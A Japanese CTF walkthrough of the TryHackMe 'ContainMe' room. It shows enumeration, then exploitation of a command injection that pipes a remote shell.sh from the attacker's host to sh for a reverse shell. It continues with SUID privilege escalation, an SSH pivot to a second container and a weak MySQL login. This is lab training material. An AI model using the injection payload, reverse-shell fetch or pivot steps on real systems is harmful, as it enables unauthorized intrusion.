# ContainMe CTF

https://tryhackme.com/room/containme1

## Enumeration

```shell
TARGET=10.10.241.188
sudo bash -c "echo $TARGET   containme.thm >> /etc/hosts"
```

### ポートスキャン

```shell
root@ip-10-10-203-245:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-06-11 07:26 BST
Nmap scan report for containme.thm (10.10.241.188)
Host is up (0.0088s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
2222/tcp open  EtherNetIP-1
8022/tcp open  oa-system
MAC Address: 02:93:A8:DC:03:71 (Unknown)
```

```sh
root@ip-10-10-203-245:~# sudo nmap -sS -sV -p22,80,2222,8022 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-06-11 07:27 BST
Nmap scan report for containme.thm (10.10.241.188)
Host is up (0.00043s latency).

PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http          Apache httpd 2.4.29 ((Ubuntu))
2222/tcp open  EtherNetIP-1?
8022/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.13ppa1+obfuscated~focal (Ubuntu Linux; protocol 2.0)
MAC Address: 02:93:A8:DC:03:71 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### gobuster

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -x=txt,php -u http://$TARGET -w ./dirlist.txt -t 30 -k

/index.php            (Status: 200) [Size: 329]
/info.php             (Status: 200) [Size: 68944]
```

index.php, info.php を発見。info は phpinfo ページ。

/index.php

```
	total 28K
drwxr-xr-x 2 root root 4.0K Jul 16  2021 .
drwxr-xr-x 3 root root 4.0K Jul 15  2021 ..
-rw-r--r-- 1 root root  11K Jul 15  2021 index.html
-rw-r--r-- 1 root root  154 Jul 16  2021 index.php
-rw-r--r-- 1 root root   20 Jul 15  2021 info.php
```

コメント

```html
<!--  where is the path ?  -->
```

path をパラメータで指定できる。

http://10.10.241.188/index.php?path=/

```
	total 80K
drwxr-xr-x  22 root   root    4.0K Jul 15  2021 .
drwxr-xr-x  22 root   root    4.0K Jul 15  2021 ..
drwxr-xr-x   2 root   root    4.0K Jun 11 01:40 bin
drwxr-xr-x   2 root   root    4.0K Jun 29  2021 boot
drwxr-xr-x   8 root   root     500 Jun 11 01:24 dev
drwxr-xr-x  81 root   root    4.0K Jun 11 01:41 etc
drwxr-xr-x   3 root   root    4.0K Jul 19  2021 home
drwxr-xr-x  16 root   root    4.0K Jun 29  2021 lib
drwxr-xr-x   2 root   root    4.0K Apr 27 05:48 lib64
drwxr-xr-x   2 root   root    4.0K Jun 29  2021 media
drwxr-xr-x   2 root   root    4.0K Jun 29  2021 mnt
drwxr-xr-x   2 root   root    4.0K Jun 29  2021 opt
dr-xr-xr-x 207 nobody nogroup    0 Jun 11 01:24 proc
drwx------   6 root   root    4.0K Jul 19  2021 root
drwxr-xr-x  17 root   root     700 Jun 11 01:42 run
drwxr-xr-x   2 root   root     12K Jun 11 01:40 sbin
drwxr-xr-x   2 root   root    4.0K Jul 14  2021 snap
drwxr-xr-x   2 root   root    4.0K Jun 29  2021 srv
dr-xr-xr-x  13 nobody nogroup    0 Jun 11 01:24 sys
drwxrwxrwt   2 root   root    4.0K Jun 11 01:40 tmp
drwxr-xr-x  10 root   root    4.0K Jun 11 01:38 usr
drwxr-xr-x  14 root   root    4.0K Jul 15  2021 var
```

それだけでなく、コマンドインジェクションが可能。

http://10.10.241.188/index.php?path=/|grep%20root

http://10.10.241.188/index.php?path=/;base64%20./index.php

フィルターは無いことが分かった。

```php
<html>
<body>
	<pre>
	<?php
		$command = "ls -alh ".$_REQUEST['path'];
		passthru($command);
	?>
	<pre>

<!--  where is the path ?  -->

</body>
</html>
```

php コマンドのリバースシェルを sh ファイルとしてホストし、実行させる。

```sh
http://10.10.241.188/index.php?path=./;curl%20-sSL%20http://10.13.85.243:8000/shell.sh%20|%20sh
```

```sh
$ nc -nlvp 8888
listening on [any] 8888 ...
connect to [10.13.85.243] from (UNKNOWN) [10.10.241.188] 56422
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 権限昇格

```sh
www-data@host1:/home/mike$ ls -al
total 384
drwxr-xr-x 5 mike mike   4096 Jul 30  2021 .
drwxr-xr-x 3 root root   4096 Jul 19  2021 ..
lrwxrwxrwx 1 root mike      9 Jul 19  2021 .bash_history -> /dev/null
-rw-r--r-- 1 mike mike    220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 mike mike   3771 Apr  4  2018 .bashrc
drwx------ 2 mike mike   4096 Jul 30  2021 .cache
drwx------ 3 mike mike   4096 Jul 30  2021 .gnupg
-rw-r--r-- 1 mike mike    807 Apr  4  2018 .profile
drwx------ 2 mike mike   4096 Jul 19  2021 .ssh
-rwxr-xr-x 1 mike mike 358668 Jul 30  2021 1cryptupx
```

1cryptupx という謎のプログラム。

```sh
www-data@host1:/home/mike$ ./1cryptupx
░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░██████╔╝██║░░██║███████╗███████╗███████╗
░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝
```

1cryptupx をローカルにコピー。

```sh
$ file ./1cryptupx
./1cryptupx: ELF 64-bit MSB *unknown arch 0x3e00* (SYSV)
```

UPX ツールでパッキングされている、ということだけ分かった。

```
$Info: This file is packed with the UPX executable packer http://upx.sf.net $

$Id: UPX 3.96 Copyright (C) 1996-2020 the UPX Team. All Rights Reserved. $
```

upx コマンドではアンパックできなかった。

```sh
$ upx -d ./1cryptupx
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2024
UPX 4.2.4       Markus Oberhumer, Laszlo Molnar & John Reiser    May 9th 2024

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
upx: ./1cryptupx: NotPackedException: not packed by UPX

Unpacked 0 files.
```

暗号に関連して、SUID を調べたときに見慣れないファイルがあった。

```sh
-data@host1:/home/mike$ find / -perm -u=s -type f -ls 2>/dev/null
   396515    352 -rwsr-xr-x   1 root     root       358668 Jul 30  2021 /usr/share/man/zh_TW/crypt
```

これを実行してみたら、同じ出力になる。diff をとったら全く同じバイナリだった。

```sh
www-data@host1:/home/mike$ /usr/share/man/zh_TW/crypt
░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░██████╔╝██║░░██║███████╗███████╗███████╗
░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝
```

よく分からないが、mike を引数にすると、root シェルになった。

```sh
www-data@host1:/home/mike$ /usr/share/man/zh_TW/crypt mike
░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░██████╔╝██║░░██║███████╗███████╗███████╗
░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝

root@host1:/home/mike# id
uid=0(root) gid=33(www-data) groups=33(www-data)
```

しかし、/root の中には何もない。コンテナからエスケープする必要がある。

## エスケープ

docker エスケープの手順を試す。cgroup v1 であることを確認。

```sh
root@host1:/home/mike# mount | grep cgroup
tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755,uid=165536,gid=165536,inode64)
cgroup on /sys/fs/cgroup/unified type cgroup2 (rw,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,name=systemd)
cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset,clone_children)
cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)
cgroup on /sys/fs/cgroup/misc type cgroup (rw,nosuid,nodev,noexec,relatime,misc)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)
cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
cgroup on /sys/fs/cgroup/rdma type cgroup (rw,nosuid,nodev,noexec,relatime,rdma)
cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
```

ステップ１のマウントで失敗。docker コマンドも無いので、他の手法も難しそう。

```sh
root@host1:/home/mike# mount -t cgroup -o rdma cgroup /tmp/cgrp
mount: /tmp/cgrp: cannot mount cgroup read-only.
```

ネットワークを調査

```sh
eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.20.2  netmask 255.255.255.0  broadcast 172.16.20.255
        inet6 fe80::216:3eff:fe46:6b29  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:46:6b:29  txqueuelen 1000  (Ethernet)
        RX packets 37  bytes 2902 (2.9 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 30  bytes 2276 (2.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

このネットワークに他にホストが存在するか確認する。自分以外が一つ見つかった。

```sh
for i in {1..254}; do ping -c 1 -W 1 172.16.20.$i > /dev/null 2>&1 && echo "172.16.20.$i is up"; done

172.16.20.2 is up
172.16.20.6 is up
```

mike の SSH 鍵を使って、ホスト２ に接続できた。

```sh
root@host1:/var/www/html# ssh mike@172.16.20.6 -i /home/mike/.ssh/id_rsa
ssh mike@172.16.20.6 -i /home/mike/.ssh/id_rsa
The authenticity of host '172.16.20.6 (172.16.20.6)' can't be established.
ECDSA key fingerprint is SHA256:L1BKa1sC+LgClbpAX5jJvzYALuhUDf1zEzhPc/C++/8.
Are you sure you want to continue connecting (yes/no)? yes
yes
Warning: Permanently added '172.16.20.6' (ECDSA) to the list of known hosts.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Mon Jul 19 20:23:18 2021 from 172.16.20.2
mike@host2:~$
```

## 権限昇格２

```sh
mike@host2:~$ netstat -nlvp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
```

MySQL が開いていることは気づいていたが、これは分からない。

```sh
mike@host2:~$ mysql -u mike -ppassword
```

```sh
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| accounts           |
+--------------------+
2 rows in set (0.01 sec)

mysql> use accounts;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+--------------------+
| Tables_in_accounts |
+--------------------+
| users              |
+--------------------+
1 row in set (0.00 sec)

mysql> select * from users;
```

## 振り返り

- 1cryptupx のオプションパラメータと、mysql の脆弱パスワード発見が難しすぎた。こういうパターンはすごく苦手。
- 自分以外のホストを探して SSH 接続する方法は勉強になった。
